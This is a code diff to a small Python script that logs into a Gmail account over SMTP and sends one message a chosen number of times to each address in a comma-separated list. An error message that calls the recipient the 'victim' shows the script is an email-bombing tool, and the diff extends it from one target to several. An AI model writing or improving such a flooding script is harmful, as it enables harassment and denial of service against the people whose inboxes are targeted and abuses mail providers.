@@ -1,17 +1,27 @@
 import smtplib
 def main(email,passw,email2,oggetto,contenuto,NUMBER_OF_EMAILS):
-	server = smtplib.SMTP('smtp.gmail.com:587')
-	server.starttls()
+	try:
+		server = smtplib.SMTP('smtp.gmail.com:587')
+		server.starttls()
 
-	server.login(email, passw)
-	
-	sent = "All sent correctly"
+		server.login(email, passw)
+		
+		output = ""
+		arremail2 = email2.split(',')
+		msg = "Subject:"+oggetto+"\n\n"+contenuto
 
-	msg = "Subject:"+oggetto+"\n\n"+contenuto
+		for i in range(NUMBER_OF_EMAILS):
+			for email2 in arremail2:
+				server.sendmail(email, email2, msg)
+				output +=(f'{i+1} email sent to {email2} \n')
+				# print(f'{i+1} email sent to {email2}')
+		server.quit()
 
-	for i in range(NUMBER_OF_EMAILS):
-		server.sendmail(email, email2, msg)
-		print(i+1, "sent!")
-	server.quit()
-	
-	return sent
+	except Exception as e:
+		if(e.args[0] == 535):
+			output = "Error - Invalid Username or Password"
+		else:
+			output = "Error - Invalid victim email"
+		
+	return output
+
